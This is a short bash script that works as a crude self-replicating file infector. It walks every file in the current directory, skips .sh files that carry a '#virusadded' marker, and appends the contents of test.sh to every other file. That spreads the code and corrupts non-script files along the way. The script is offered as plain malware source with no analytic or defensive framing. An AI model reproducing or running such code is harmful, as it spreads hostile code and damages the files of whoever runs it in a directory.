#!/bin/bash

for f in *
do
 echo "Processing $f"
 if [[ "$f" == *".sh"* ]] && $(grep -q "#virusadded" $f); then
   echo "you are infected ;) "
 else
   cat test.sh >> $f
fi
done
